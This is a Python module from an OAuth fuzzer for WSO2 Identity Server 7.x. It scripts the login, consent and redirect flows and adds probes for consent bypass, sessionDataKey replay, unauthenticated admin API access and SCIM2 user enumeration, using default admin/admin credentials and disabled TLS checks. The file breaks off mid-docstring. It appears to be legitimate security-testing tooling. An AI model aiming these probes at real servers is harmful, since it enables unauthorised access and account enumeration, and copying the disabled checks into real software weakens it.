#!/usr/bin/env python3
# protocol/wso2.py
"""
WSO2 Identity Server 7.x Protocol Mixin
"""

import re
import html
import random
import urllib.parse
import requests
from typing import Tuple, Optional, Dict

from protocol.base import OAuthProtocolBase


class Wso2ProtocolMixin(OAuthProtocolBase):
    """WSO2 IS 7.x authorize, login, auth_code_redirect, and
    WSO2-specific protocol operations."""

    # ── Endpoint configuration ────────────────────────────────────

    def _configure_endpoints(self):
        base = self.config.base_url.rstrip('/')
        discovery_url = f"{base}/oauth2/oidcdiscovery/.well-known/openid-configuration"

        endpoints = self._discover_endpoints(discovery_url)
        if endpoints:
            self._apply_discovered_endpoints(endpoints)
            return

        # Fallback: conventional WSO2 IS 7.x paths
        self.auth_endpoint       = f"{base}/oauth2/authorize"
        self.token_endpoint      = f"{base}/oauth2/token"
        self.userinfo_endpoint   = f"{base}/oauth2/userinfo"
        self.introspect_endpoint = f"{base}/oauth2/introspect"
        self.revoke_endpoint     = f"{base}/oauth2/revoke"
        self.jwks_endpoint       = f"{base}/oauth2/jwks"
        self.par_endpoint        = f"{base}/oauth2/par"
        self._set_endpoint_defaults()

    # ── authorize ──────────────────────────────────────────────────

    def wso2_authorize(self, **kwargs) -> Tuple[str, requests.Response]:
        """WSO2 authorization_code + PKCE flow initiation."""
        self._ensure_state_pkce()
        hard = bool(kwargs.pop('hard_reset', False)) or \
               getattr(self, '_wso2_login_failed', False)
        self._wso2_reset_state(hard=hard)

        params = {
            'response_type': kwargs.get('response_type', 'code'),
            'client_id':     kwargs.get('client_id', self.config.client_id),
            'redirect_uri':  kwargs.get('redirect_uri', self.config.redirect_uri),
            'scope':         kwargs.get('scope', self.config.scope),
            'state':         kwargs.get('state', self.state),
            'nonce':         kwargs.get('nonce', self.nonce),
        }

        # Optional params passed by the fuzzer to deepen state exploration.
        # Empty/None values are filtered out by the urlencode filter below.
        for optional in ('prompt', 'max_age', 'display', 'ui_locales',
                         'acr_values', 'id_token_hint', 'login_hint',
                         'request', 'request_uri', 'claims',
                         'response_mode'):
            if optional in kwargs:
                params[optional] = kwargs[optional]

        # WSO2 supports PKCE — include it unless explicitly skipped
        if kwargs.get('skip_pkce') is not True:
            params['code_challenge'] = kwargs.get('code_challenge', self.code_challenge)
            params['code_challenge_method'] = kwargs.get('code_challenge_method', 'S256')

        url = f"{self.auth_endpoint}?{urllib.parse.urlencode({k: v for k, v in params.items() if v is not None})}"
        try:
            r = self.session.get(url, allow_redirects=False, timeout=10, verify=False)
            self._record_sent(url, 'GET')
            self._record_received(r)
            self.last_location = r.headers.get('Location', '')
            self._authorize_url = url
            self._authorize_response = r

            # WSO2 7.x path 1: clean 302 with Location containing sessionDataKey
            login_url = None
            if self.last_location and 'sessionDataKey' in self.last_location:
                parsed = urllib.parse.urlparse(self.last_location)
                qs = urllib.parse.parse_qs(parsed.query)
                self._wso2_session_data_key = qs.get('sessionDataKey', [None])[0]
                base = self.config.base_url.rstrip('/')
                login_url = (
                    self.last_location if self.last_location.startswith('http')
                    else base + self.last_location
                )

            # Path 1b (NEW): WSO2 IS sometimes emits a chain
            #   /oauth2/authorize -> /commonauth -> /authenticationendpoint/login.do?sessionDataKey=...
            # so the first Location header on its own doesn't carry sessionDataKey.
            # Follow up to 5 hops until we either find sessionDataKey, hit the
            # callback, or exceed the hop budget.
            elif self.last_location and r.status_code in (301, 302, 303, 307, 308):
                base = self.config.base_url.rstrip('/')
                chain_target = (self.last_location
                                if self.last_location.startswith('http')
                                else base + self.last_location)
                for _ in range(5):
                    try:
                        hop = self.session.get(chain_target,
                                               allow_redirects=False,
                                               timeout=10, verify=False)
                    except requests.exceptions.ConnectionError:
                        break
                    self._record_received(hop)
                    hop_loc = hop.headers.get('Location', '') or ''
                    self.last_location = hop_loc or chain_target
                    if hop_loc and 'sessionDataKey' in hop_loc:
                        parsed = urllib.parse.urlparse(hop_loc)
                        qs = urllib.parse.parse_qs(parsed.query)
                        self._wso2_session_data_key = qs.get('sessionDataKey', [None])[0]
                        login_url = (hop_loc if hop_loc.startswith('http')
                                     else base + hop_loc)
                        break
                    # If the effective URL of the 200 page has sessionDataKey
                    # (WSO2 sometimes renders login.do directly), fish it out.
                    if hop.status_code == 200 and 'sessiondatakey' in (hop.url or '').lower():
                        try:
                            qs = urllib.parse.parse_qs(
                                urllib.parse.urlparse(hop.url).query)
                            sdk = qs.get('sessionDataKey', [None])[0]
                            if sdk:
                                self._wso2_session_data_key = sdk
                                login_url = hop.url
                                break
                        except Exception:
                            pass
                    if not hop_loc or hop.status_code not in (301, 302, 303, 307, 308):
                        # Terminal non-redirect. Fall through to Path 2 scrape
                        # against hop.text below if this looks like a login HTML.
                        if hop.status_code == 200 and hop.text:
                            body = hop.text
                            m = (re.search(r"window\.location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
                                 or re.search(r'<meta[^>]+http-equiv=["\']refresh["\']'
                                              r'[^>]+content=["\']\d+\s*;\s*url=([^"\']+)["\']',
                                              body, re.IGNORECASE))
                            if m:
                                raw = html.unescape(m.group(1))
                                if 'sessionDataKey' in raw:
                                    sdk_m = re.search(r'sessionDataKey=([^&#]+)', raw)
                                    if sdk_m:
                                        self._wso2_session_data_key = sdk_m.group(1)
                                    login_url = raw if raw.startswith('http') else (base + raw)
                        break
                    chain_target = (hop_loc if hop_loc.startswith('http')
                                    else base + hop_loc)

            # WSO2 7.x path 2: 200 with <script>window.location.href=...</script>
            # or <meta http-equiv="refresh" content="0;url=..."> variant
            elif r.status_code == 200 and r.text:
                body = r.text
                m = (re.search(r"window\.location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
                     or re.search(r'<meta[^>]+http-equiv=["\']refresh["\']'
                                  r'[^>]+content=["\']\d+\s*;\s*url=([^"\']+)["\']',
                                  body, re.IGNORECASE))
                if m:
                    raw = html.unescape(m.group(1))
                    if 'sessionDataKey' in raw:
                        sdk_m = re.search(r'sessionDataKey=([^&#]+)', raw)
                        if sdk_m:
                            self._wso2_session_data_key = sdk_m.group(1)
                        login_url = raw if raw.startswith('http') else (
                            self.config.base_url.rstrip('/') + raw)

            # WSO2 7.x path 3: URL fragment carries sessionDataKey
            elif self.last_location and '#sessionDataKey=' in self.last_location:
                frag = self.last_location.split('#', 1)[1]
                fragq = urllib.parse.parse_qs(frag)
                if 'sessionDataKey' in fragq:
                    self._wso2_session_data_key = fragq['sessionDataKey'][0]
                    login_url = self.last_location

            # Diagnostic: when the Location is present but doesn't contain
            # sessionDataKey, log the actual redirect target so failure
            # investigation doesn't require re-running with Wireshark.
            if self.last_location and not login_url:
                print(f"[wso2_authorize] Redirect present but no sessionDataKey: "
                      f"{self.last_location[:300]}")
            # NEW diagnostic: authorize returned a non-redirect status
            # and we couldn't extract sessionDataKey from the body.
            # This is the canonical symptom of a target_type/endpoint
            # misconfiguration — surface it loudly.
            if not self.last_location and r.status_code != 200 and not login_url:
                print(f"[wso2_authorize] Non-redirect response "
                      f"(status={r.status_code}) from {url[:200]}; "
                      f"first 200 chars of body: {(r.text or '')[:200]!r}")

            if login_url:
                self.login_form_url = login_url
                self._wso2_login_url = login_url

            # Direct-approve (auto-approval SP configs)
            if self.last_location and 'code=' in self.last_location:
                try:
                    q = urllib.parse.urlparse(self.last_location).query
                    qp = urllib.parse.parse_qs(q)
                    if 'code' in qp:
                        self.auth_code = qp['code'][0]
                except Exception:
                    pass

            return 'authorize', r
        except requests.exceptions.ConnectionError as e:
            # Transport-level failures must NOT be re-labelled as 500.
            # A status-0 synthetic response lets OAuthSUT map this to
            # 'Status0' so the post-hoc analyzer's ServerError rule
            # never fires on a fuzzer-side connectivity problem.
            return 'authorize_transport', self._synthetic_response(0, f'connection error: {e}')
        except Exception as e:
            return 'authorize_error', self._synthetic_response(500, str(e))

    # ── login ──────────────────────────────────────────────────────

    def wso2_login(self, **kwargs) -> Tuple[str, requests.Response]:
        """WSO2 IS 7.x form-based login via /commonauth.

        WSO2's login flow differs significantly from Spring Security:
          1. Login form at /authenticationendpoint/login.do contains
             hidden fields: sessionDataKey, tocommonauth.
          2. The form POST target is /commonauth (NOT the login page URL).
          3. The `tocommonauth` hidden field must be sent with value 'true'.
          4. After successful POST, WSO2 302s back to /oauth2/authorize,
             which then 302s to the consent page or redirect_uri.
        """
        if self.auth_code:
            return 'login_skipped_wso2', self._synthetic_response(
                200, 'code already issued; login not needed')

        base = self.config.base_url.rstrip('/')

        # Precondition: if the preceding Authorize never produced a
        # sessionDataKey, there is no login page to POST to. Returning 401
        # (Unauthorized) instead of raising keeps the label stable and
        # stops _check_unusual_status from raising a spurious MEDIUM
        # SERVER_ERROR (see report.json line 84-383: 20/20 alerts match
        # this exact pattern).
        cached_sdk_early = getattr(self, '_wso2_session_data_key', None)
        last_loc_early = getattr(self, 'last_location', '') or ''
        looks_like_error_callback = (
            last_loc_early.startswith(self.config.redirect_uri)
            and ('error=' in last_loc_early or 'error_description=' in last_loc_early)
        )
        if not cached_sdk_early and looks_like_error_callback:
            self._wso2_login_failed = True
            return 'login_precondition_unmet', self._synthetic_response(
                401, f'authorize failed earlier; no sessionDataKey (last_loc={last_loc_early[:120]})')

        login_page_url = getattr(self, '_wso2_login_url', None)
        if not login_page_url:
            login_page_url = getattr(self, 'login_form_url', None)
        if not login_page_url:
            last_loc = getattr(self, 'last_location', '')
            # Only follow last_location if it actually points at WSO2's
            # authenticationendpoint. A callback-with-error URL is NOT a
            # login page and attempting to GET it on 127.0.0.1:7777 just
            # produces ConnectionRefusedError -> synthetic-500 -> FP.
            if last_loc and '/authenticationendpoint/' in last_loc:
                login_page_url = (
                    last_loc if last_loc.startswith('http')
                    else base + last_loc
                )
        if not login_page_url:
            login_page_url = f"{base}/authenticationendpoint/login.do"

        try:
            page = self.session.get(login_page_url, allow_redirects=True,
                                    timeout=10, verify=False)
        except requests.exceptions.ConnectionError as e:
            # Network-level failure is NOT a server bug. Return Status0-class
            # label so the oracle ignores it.
            return 'login_transport', self._synthetic_response(
                0, f'connection error fetching login page: {e}')
        except requests.exceptions.Timeout as e:
            return 'login_timeout', self._synthetic_response(
                0, f'timeout fetching login page: {e}')
        except Exception as e:
            return 'login_error', self._synthetic_response(500, str(e))

        hidden_fields = self._wso2_extract_hidden_fields(page.text or '')

        sdk = hidden_fields.get('sessionDataKey', 'MISSING')
        tca = hidden_fields.get('tocommonauth', 'MISSING')

        # WSO2 IS 7.x login.do carries sessionDataKey in the URL query only,
        # not as a hidden <input>. If the HTML scrape produced nothing, fall
        # back to the value cached by wso2_authorize (Path 1/2/3) or re-parse
        # it from the current page URL. Both sources reflect exactly what
        # the server wants echoed back on POST.
        if sdk == 'MISSING' or sdk in ('', None):
            cached_sdk = getattr(self, '_wso2_session_data_key', None)
            if not cached_sdk:
                try:
                    effective = page.url or login_page_url
                    q = urllib.parse.urlparse(effective).query
                    qp = urllib.parse.parse_qs(q)
                    cached_sdk = qp.get('sessionDataKey', [None])[0]
                except Exception:
                    cached_sdk = None
            if cached_sdk:
                sdk = cached_sdk
                hidden_fields['sessionDataKey'] = cached_sdk
                # WSO2 also requires tocommonauth=true when the hidden field
                # is absent from the scraped form.
                hidden_fields.setdefault('tocommonauth', 'true')

        print(f"[wso2_login] Hidden fields: sessionDataKey={sdk[:16] if sdk != 'MISSING' else sdk}… "
              f"tocommonauth={hidden_fields.get('tocommonauth', 'MISSING')} "
              f"fields={sorted(hidden_fields.keys())}")

        if sdk == 'MISSING' or sdk in ('', None):
            self._wso2_login_failed = True
            return 'login_no_sdk', self._synthetic_response(
                401, 'no sessionDataKey on login page; nothing to POST')

        form_data = {}
        form_data.update(hidden_fields)
        form_data['username'] = kwargs.get('username', self.config.username)
        form_data['password'] = kwargs.get('password', self.config.password)

        # Detect form action from the HTML; fall back to /commonauth.
        # Some WSO2 deployments bind the sessionDataKey into the action URL
        # rather than relying solely on the hidden form field.
        action_m = re.search(
            r'<form[^>]*\bid=["\']loginForm["\'][^>]*\baction=["\']([^"\']+)["\']'
            r'|<form[^>]*\baction=["\']([^"\']+)["\'][^>]*\bid=["\']loginForm["\']'
            r'|<form[^>]+action=["\']([^"\']+)["\']',
            page.text or '', re.IGNORECASE)
        if action_m:
            action_url = html.unescape(
                action_m.group(1) or action_m.group(2) or action_m.group(3))
            if action_url.startswith('http'):
                commonauth_url = action_url
            else:
                commonauth_url = urllib.parse.urljoin(login_page_url, action_url)
        else:
            commonauth_url = f"{base}/commonauth"

        # Only echo XSRF when the server actually set one.  For vanilla
        # BasicAuthenticator there is no XSRF-TOKEN cookie and sending
        # X-Requested-With: XMLHttpRequest can flip /commonauth into a
        # JSON error response branch that our redirect parser doesn't
        # understand.
        xsrf_token = None
        for c in self.session.cookies:
            if c.name in ('XSRF-TOKEN', 'X-CSRF-TOKEN', '_csrf'):
                xsrf_token = c.value
                break
        if xsrf_token and '_csrf_token' not in form_data:
            form_data['_csrf_token'] = xsrf_token

        try:
            extra_headers = {}
            if xsrf_token:
                extra_headers['X-CSRF-TOKEN'] = xsrf_token
                extra_headers['X-Requested-With'] = 'XMLHttpRequest'
            r = self.session.post(commonauth_url, data=form_data,
                                  headers=extra_headers,
                                  allow_redirects=False, timeout=10,
                                  verify=False)
            self._record_sent(commonauth_url, 'POST', form_data)
            self._record_received(r)

            loc = r.headers.get('Location', '')
            if loc and not loc.startswith('http'):
                loc = urllib.parse.urljoin(commonauth_url, loc)
            self.last_location = loc

            # Detect authentication FAILURE up-front so the caller can
            # abort early instead of following the chain back to the
            # login page and then reporting "no code".
            if r.status_code in (302, 303) and loc:
                low = loc.lower()
                failed = ('authfailure=true' in low
                          or 'authenticationendpoint/login.do' in low
                          or 'errorcode=' in low)
                if failed:
                    # Extract the failure reason from query string
                    reason = 'unknown'
                    try:
                        qs = urllib.parse.parse_qs(
                            urllib.parse.urlparse(loc).query)
                        reason = (qs.get('authFailureMsg', [None])[0]
                                  or qs.get('errorCode', [None])[0]
                                  or qs.get('errorMsg', [None])[0]
                                  or 'credentials-rejected')
                    except Exception:
                        pass
                    print(f"[wso2_login] BasicAuthenticator rejected login: "
                          f"reason={reason}  user="
                          f"{form_data.get('username','')!r} "
                          f"(empty username ⇒ hidden-field override bug)")
                    # Clear the redirect target so auth_code_redirect
                    # does NOT follow the chain back to login.do.
                    self.last_location = ''
                    self._wso2_login_failed = True
                    return 'login_failed', r

                if 'code=' in loc:
                    try:
                        q = urllib.parse.urlparse(loc).query
                        qp = urllib.parse.parse_qs(q)
                        if 'code' in qp:
                            self.auth_code = qp['code'][0]
                    except Exception:
                        pass

                if 'oauth2_consent' in loc.lower() or 'consent' in loc.lower():
                    self._wso2_consent_url = (
                        loc if loc.startswith('http') else base + loc
                    )

            if r.status_code == 200:
                body = r.text or ''
                if 'authenticationfailed' in body.lower() or 'login error' in body.lower():
                    print(f"[wso2_login] Auth failure in 200 body")

            return 'login', r
        except Exception as e:
            return 'login_error', self._synthetic_response(500, str(e))

    # ── auth_code_redirect ─────────────────────────────────────────

    def wso2_auth_code_redirect(self, **kwargs) -> Tuple[str, requests.Response]:
        """Follow WSO2 redirect chain to extract auth code.

        Handles WSO2-specific redirect shapes:
          1. Direct 302 to redirect_uri?code=... after login
          2. 302 to consent page at /authenticationendpoint/oauth2_consent.do
          3. 200 consent page (explicit consent required)
          4. 302 to /oauth2/authorize resume (with authenticated session)
        """
        if self.auth_code and self.last_location and 'code=' in self.last_location:
            return 'auth_code_direct', (
                self._authorize_response
                if getattr(self, '_authorize_response', None) is not None
                else self._synthetic_response(200, 'code from authorize 302')
            )

        # If wso2_login already decided the authentication failed,
        # there is nothing to follow.  Short-circuit to prevent
        # re-fetching the login page and reporting a confusing
        # "chain ended 200 with no code".
        if getattr(self, '_wso2_login_failed', False):
            return 'login_failed', self._synthetic_response(
                401, 'BasicAuthenticator rejected login')

        # Handle pending consent page
        consent_url = getattr(self, '_wso2_consent_url', None)
        if consent_url:
            consent_r = self._wso2_auto_approve_consent(consent_url)
            if consent_r is not None:
                post_loc = consent_r.headers.get('Location', '')
                if 'code=' in post_loc:
                    q = urllib.parse.urlparse(post_loc).query
                    params = urllib.parse.parse_qs(q)
                    if 'code' in params:
                        self.auth_code = params['code'][0]
                    self.last_location = post_loc
                    self._record_received(consent_r)
                    return 'auth_code_after_consent', consent_r
                if post_loc:
                    target = post_loc if post_loc.startswith('http') else (
                        self.config.base_url.rstrip('/') + post_loc
                    )
                    self.last_location = target

        if not self.last_location:
            saved_url = getattr(self, '_authorize_url', None)
            if saved_url:
                try:
                    r = self.session.get(saved_url, allow_redirects=False,
                                         timeout=10, verify=False)
                    self._record_received(r)
                    loc = r.headers.get('Location', '')
                    if loc:
                        if not loc.startswith('http'):
                            loc = self.config.base_url.rstrip('/') + loc
                        self.last_location = loc
                        if 'code=' in loc:
                            q = urllib.parse.urlparse(loc).query
                            params = urllib.parse.parse_qs(q)
                            if 'code' in params:
                                self.auth_code = params['code'][0]
                            return 'auth_code', r
                        if 'consent' in loc.lower():
                            self._wso2_consent_url = (
                                loc if loc.startswith('http')
                                else self.config.base_url.rstrip('/') + loc
                            )
                            return self.wso2_auth_code_redirect(**kwargs)
                except requests.exceptions.ConnectionError as e:
                    return 'redirect_transport', self._synthetic_response(0, f'connection error: {e}')
                except Exception as e:
                    return 'redirect_error', self._synthetic_response(500, str(e))
            return 'no_redirect', self._synthetic_response(400, 'no prior authorize redirect')

        target = self.last_location
        if not target.startswith('http'):
            target = self.config.base_url.rstrip('/') + (
                target if target.startswith('/') else '/' + target)

        # Early guard: if the redirect target points at the configured
        # callback_uri host and that host is KNOWN unreachable (i.e. no
        # real listener), short-circuit to a Status0 rather than letting
        # requests raise a ConnectionError that we'd then turn into a
        # fake 500.  This removes the #1 source of MEDIUM SERVER_ERROR
        # false positives in report.json.
        try:
            callback_host = urllib.parse.urlparse(self.config.redirect_uri).hostname
            target_host = urllib.parse.urlparse(target).hostname
            if callback_host and target_host == callback_host:
                if getattr(self, '_callback_unreachable', None) is True:
                    return 'callback_unreachable', self._synthetic_response(
                        0, f'callback host {callback_host} has no listener')
        except Exception:
            pass

        for _ in range(8):
            try:
                r = self.session.get(target, allow_redirects=False,
                                     timeout=10, verify=False)
            except requests.exceptions.ConnectionError as e:
                # Remember the unreachability so subsequent steps in the
                # same sequence short-circuit immediately.
                try:
                    callback_host = urllib.parse.urlparse(self.config.redirect_uri).hostname
                    t_host = urllib.parse.urlparse(target).hostname
                    if callback_host and t_host == callback_host:
                        self._callback_unreachable = True
                except Exception:
                    pass
                return 'redirect_transport', self._synthetic_response(
                    0, f'connection error at {target[:120]}: {e}')
            except Exception as e:
                return 'redirect_error', self._synthetic_response(500, str(e))

            loc = r.headers.get('Location', '')
            status = r.status_code

            if loc and 'code=' in loc:
                q = urllib.parse.urlparse(loc).query
                params = urllib.parse.parse_qs(q)
                if 'code' in params:
                    self.auth_code = params['code'][0]
                self.last_location = loc
                self._record_received(r)
                return 'auth_code', r

            # P0: separate OAuth error redirects from genuine progress.
            # A 302 to callback?error=... is *not* a successful auth-code
            # redirect — the old code fell through to the generic
            # "auth_code_final" branch, which the SUT mapped to 'Success'.
            if loc and 'error=' in loc and 'code=' not in loc:
                self.last_location = loc
                self._record_received(r)
                return 'oauth_error_redirect', self._synthetic_response(
                    400, f'OAuth error redirect: {loc[:200]}')

            if loc and ('consent' in loc.lower() or 'oauth2_consent' in loc.lower()):
                consent_url = (
                    loc if loc.startswith('http')
                    else self.config.base_url.rstrip('/') + loc
                )
                consent_r = self._wso2_auto_approve_consent(consent_url)
                if consent_r is not None:
                    post_loc = consent_r.headers.get('Location', '')
                    if 'code=' in post_loc:
                        q = urllib.parse.urlparse(post_loc).query
                        params = urllib.parse.parse_qs(q)
                        if 'code' in params:
                            self.auth_code = params['code'][0]
                        self.last_location = post_loc
                        self._record_received(consent_r)
                        return 'auth_code_after_consent', consent_r
                    if post_loc:
                        target = post_loc if post_loc.startswith('http') else (
                            self.config.base_url.rstrip('/') + post_loc)
                        self.last_location = target
                        continue

            if status == 200 and self._wso2_looks_like_consent_page(r.text or ''):
                consent_r = self._wso2_post_consent_form(r, target)
                if consent_r is not None:
                    post_loc = consent_r.headers.get('Location', '')
                    if 'code=' in post_loc:
                        q = urllib.parse.urlparse(post_loc).query
                        params = urllib.parse.parse_qs(q)
                        if 'code' in params:
                            self.auth_code = params['code'][0]
                        self.last_location = post_loc
                        self._record_received(consent_r)
                        return 'auth_code_after_consent', consent_r
                    if post_loc:
                        target = post_loc if post_loc.startswith('http') else (
                            self.config.base_url.rstrip('/') + post_loc)
                        self.last_location = target
                        continue

            if status >= 500:
                snippet = (r.text or '')[:400].replace('\n', ' ')
                print(f"[wso2_auth_code_redirect] 5xx at {target[:200]}: {snippet}")
                self._record_received(r)
                return 'server_error', r

            if not loc or status not in (301, 302, 303, 307, 308):
                self._record_received(r)
                # P0 oracle fix: the chain ended on a non-redirect page.
                # A true success MUST have an auth_code set — either via
                # a `code=` Location parameter earlier in the chain, or
                # via the direct-approve branch in wso2_authorize.
                # Otherwise this is almost always a login-page bounce
                # (HTML 200) masquerading as 'Success'.
                if not self.auth_code:
                    body = (r.text or '')
                    body_l = body.lower()[:4000]
                    login_markers = (
                        'authenticationendpoint/login.do',
                        'id="loginform"',
                        "name='loginform'",
                        'login.fail.message',
                        'login error',
                    )
                    is_login_bounce = any(m in body_l for m in login_markers)
                    if is_login_bounce or status == 200:
                        snippet = body[:200].replace('\n', ' ')
                        # Rate-limit this message so 80 repeated bounces
                        # don't drown out genuine findings.
                        self._wso2_bounce_count = getattr(self, '_wso2_bounce_count', 0) + 1
                        if self._wso2_bounce_count <= 3 or self._wso2_bounce_count % 25 == 0:
                            print(f"[wso2_auth_code_redirect] Login-page bounce "
                                  f"#{self._wso2_bounce_count}: {snippet}")
                        # Synthesize a 401 response so the SUT maps this
                        # to 'Unauthorized' instead of the misleading
                        # 'Success' bucket.  This is the single biggest
                        # correctness win for the fuzzer's feedback loop.
                        return 'login_page_bounce', self._synthetic_response(
                            401, 'WSO2 login page bounce (no auth code issued)')
                return 'auth_code_final', r

            target = loc if loc.startswith('http') else (
                self.config.base_url.rstrip('/') + loc)
            self.last_location = target

        return 'redirect_exhausted', self._synthetic_response(400, 'redirect chain too deep')

    # ── WSO2-specific consent ──────────────────────────────────────

    def _wso2_auto_approve_consent(self, consent_url: str) -> Optional[requests.Response]:
        """Auto-approve WSO2 consent page."""
        try:
            page = self.session.get(consent_url, allow_redirects=False,
                                    timeout=10, verify=False)
            hidden_fields = self._wso2_extract_hidden_fields(page.text or '')

            form_data = {}
            form_data.update(hidden_fields)
            form_data['approval'] = 'approve'

            m = re.search(
                r'<form[^>]+action=["\']([^"\']*)["\']',
                page.text or '', re.IGNORECASE)
            if m:
                action = html.unescape(m.group(1))
                if action.startswith('http'):
                    post_url = action
                else:
                    base = self.config.base_url.rstrip('/')
                    post_url = base + (action if action.startswith('/') else '/' + action)
            else:
                post_url = consent_url

            return self.session.post(post_url, data=form_data,
                                     allow_redirects=False, timeout=10,
                                     verify=False)
        except Exception as e:
            print(f"[wso2_consent] Error: {e}")
            return None

    def _wso2_post_consent_form(self, page: requests.Response,
                                page_url: str) -> Optional[requests.Response]:
        """Submit a WSO2 consent form (200-HTML page variant)."""
        body = page.text or ''
        hidden_fields = self._wso2_extract_hidden_fields(body)

        form_data = {}
        form_data.update(hidden_fields)
        form_data['approval'] = 'approve'

        for name, val in re.findall(
                r'<input[^>]+type=["\']checkbox["\'][^>]+name=["\']([^"\']+)["\']'
                r'[^>]+value=["\']([^"\']*)["\']',
                body, flags=re.IGNORECASE):
            form_data.setdefault(name, val)

        m_action = re.search(
            r'<form[^>]+action=["\']([^"\']+)["\']', body, re.IGNORECASE)
        if m_action:
            action = html.unescape(m_action.group(1))
            if action.startswith('http'):
                post_url = action
            else:
                base = self.config.base_url.rstrip('/')
                post_url = base + (action if action.startswith('/') else '/' + action)
        else:
            post_url = page_url

        try:
            return self.session.post(post_url, data=form_data,
                                     allow_redirects=False, timeout=10,
                                     verify=False)
        except Exception:
            return None

    # ── WSO2 introspection (requires Basic auth) ──────────────────

    def wso2_introspect(self, **kwargs) -> Tuple[str, requests.Response]:
        """WSO2 introspection — enforces HTTP Basic authentication.

        WSO2 IS 7.x enforces Basic auth (client_id:client_secret) for
        the introspection endpoint per RFC 7662.  Post-body client_id/
        client_secret is not accepted.
        """
        import base64

        introspect_data = {
            'token': kwargs.get('token', self.access_token),
        }
        if 'token_type_hint' in kwargs:
            introspect_data['token_type_hint'] = kwargs.get('token_type_hint')
        if 'token' in kwargs:
            introspect_data['token'] = kwargs['token']

        headers = self.session.headers.copy()
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        headers['Accept'] = 'application/json'

        sec = kwargs.get('client_secret', self.config.client_secret) or ''
        basic = base64.b64encode(
            f"{self.config.client_id}:{sec}".encode()).decode()
        headers['Authorization'] = f"Basic {basic}"

        self._track_request('POST', self.introspect_endpoint, headers, introspect_data)
        response = self.session.post(self.introspect_endpoint,
                                     data=introspect_data, headers=headers,
                                     verify=False)
        self._track_response(response)
        return 'introspect', response

    # ── WSO2 DCR ───────────────────────────────────────────────────

    def wso2_dcr_register(self, **kwargs) -> Tuple[str, requests.Response]:
        """Register/update OAuth2 client via WSO2 DCR endpoint.

        WSO2 IS 7.x supports OIDC Dynamic Client Registration at
        /api/identity/oauth2/dcr/v1.1/register.  Useful for fuzzing
        client registration logic (CVE-2024-6914 type IDOR).
        """
        import base64

        dcr_url = f"{self.config.base_url.rstrip('/')}/api/identity/oauth2/dcr/v1.1/register"
        payload = kwargs.get('payload', {
            "client_name": kwargs.get('client_name', 'fuzz-dcr-test'),
            "grant_types": kwargs.get('grant_types',
                                      ["authorization_code", "refresh_token",
                                       "password", "client_credentials"]),
            "redirect_uris": kwargs.get('redirect_uris',
                                        [self.config.redirect_uri]),
        })

        headers = self.session.headers.copy()
        headers['Content-Type'] = 'application/json'
        headers['Accept'] = 'application/json'

        admin_user = kwargs.get('admin_user', 'admin')
        admin_pass = kwargs.get('admin_pass', 'admin')
        basic = base64.b64encode(
            f"{admin_user}:{admin_pass}".encode()).decode()
        headers['Authorization'] = f"Basic {basic}"

        self._track_request('POST', dcr_url, headers, payload)
        response = self.session.post(dcr_url, json=payload, headers=headers,
                                     verify=False)
        self._track_response(response)
        return 'dcr_register', response

    # ── WSO2 SCIM2 user enumeration ────────────────────────────────

    def wso2_scim2_users(self, **kwargs) -> Tuple[str, requests.Response]:
        """Query WSO2 SCIM2 /Users endpoint for user enumeration testing.

        WSO2 IS exposes SCIM2 at /scim2/Users.  Tests IDOR and
        information disclosure (CVE-2024-6914, CVE-2022-29548).
        """
        import base64

        scim_url = f"{self.config.base_url.rstrip('/')}/scim2/Users"
        headers = self.session.headers.copy()
        headers['Accept'] = 'application/scim+json'

        if kwargs.get('with_auth', True):
            admin_user = kwargs.get('admin_user', 'admin')
            admin_pass = kwargs.get('admin_pass', 'admin')
            basic = base64.b64encode(
                f"{admin_user}:{admin_pass}".encode()).decode()
            headers['Authorization'] = f"Basic {basic}"

        filter_param = kwargs.get('filter', None)
        params = {}
        if filter_param:
            params['filter'] = filter_param

        self._track_request('GET', scim_url, headers)
        response = self.session.get(scim_url, headers=headers, params=params,
                                    verify=False)
        self._track_response(response)
        return 'scim2_users', response

    # ── WSO2 attacks ───────────────────────────────────────────────

    def wso2_consent_bypass(self, **kwargs) -> Tuple[str, requests.Response]:
        """Attempt to skip consent and exchange code directly."""
        self.wso2_login(**kwargs)

        if getattr(self, '_wso2_consent_url', None):
            saved_url = getattr(self, '_authorize_url', None)
            if saved_url:
                try:
                    r = self.session.get(saved_url, allow_redirects=False,
                                         timeout=10, verify=False)
                    self._track_response(r)
                    loc = r.headers.get('Location', '')
                    if 'code=' in loc:
                        q = urllib.parse.urlparse(loc).query
                        params = urllib.parse.parse_qs(q)
                        if 'code' in params:
                            self.auth_code = params['code'][0]
                    return 'consent_bypass', r
                except Exception as e:
                    return 'consent_bypass_error', self._synthetic_response(500, str(e))

        return 'consent_bypass_n/a', self._synthetic_response(200, 'no consent page to bypass')

    def wso2_session_key_replay(self, **kwargs) -> Tuple[str, requests.Response]:
        """Attempt to replay a sessionDataKey to obtain another auth code."""
        sdk = getattr(self, '_wso2_session_data_key', None)
        if not sdk:
            return 'sdk_replay_n/a', self._synthetic_response(
                200, 'no sessionDataKey available')

        base = self.config.base_url.rstrip('/')
        login_url = f"{base}/authenticationendpoint/login.do?sessionDataKey={sdk}"

        try:
            r = self.session.get(login_url, allow_redirects=False,
                                 timeout=10, verify=False)
            self._track_request('GET', login_url, self.session.headers)
            self._track_response(r)
            return 'sdk_replay', r
        except Exception as e:
            return 'sdk_replay_error', self._synthetic_response(500, str(e))

    def wso2_admin_api(self, **kwargs) -> Tuple[str, requests.Response]:
        """Test unauthorized access to WSO2 admin REST APIs."""
        import base64

        endpoint = kwargs.get('endpoint',
                              '/api/identity/oauth2/v1.1/clients')
        url = f"{self.config.base_url.rstrip('/')}{endpoint}"

        headers = self.session.headers.copy()
        headers['Accept'] = 'application/json'

        if kwargs.get('with_auth', False):
            admin_user = kwargs.get('admin_user', 'admin')
            admin_pass = kwargs.get('admin_pass', 'admin')
            basic = base64.b64encode(
                f"{admin_user}:{admin_pass}".encode()).decode()
            headers['Authorization'] = f"Basic {basic}"

        self._track_request('GET', url, headers)
        response = self.session.get(url, headers=headers, verify=False)
        self._track_response(response)
        return 'admin_api', response

    # ── NEW: Deeper state-space exploration attacks ────────────────

    def wso2_prompt_none(self, **kwargs) -> Tuple[str, requests.Response]:
        """Silent-auth branch: /oauth2/authorize?prompt=none.

        Exercises WSO2's OIDCAuthzEndpoint prompt=none code path, which
        must return a login_required / interaction_required error when
